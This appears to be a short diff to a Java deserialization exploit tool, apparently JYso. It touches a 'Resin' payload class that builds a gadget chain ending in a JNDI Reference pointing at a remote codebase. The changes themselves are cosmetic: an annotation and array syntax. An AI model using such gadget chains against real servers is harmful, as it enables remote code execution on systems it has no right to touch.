@@ -13,6 +13,7 @@ import java.util.Hashtable;
 
 import static com.qi4l.JYso.gadgets.utils.Utils.makeMap;
 
+@SuppressWarnings({"unused"})
 public class Resin implements ObjectPayload<Object> {
     public static Object makeToStringTrigger(Object o) throws Exception {
         String unhash = unhash(o.hashCode());
@@ -66,7 +67,7 @@ public class Resin implements ObjectPayload<Object> {
         Reflections.setFieldValue(cpe, "stackTrace", null);
         //考虑换成其他的
         URI uri = new URI(command);
-        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+        String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
         cpe.setResolvedObj(new Reference("Foo", args[1], args[0]));
 
         Reflections.setFieldValue(cpe, "suppressedExceptions", null);
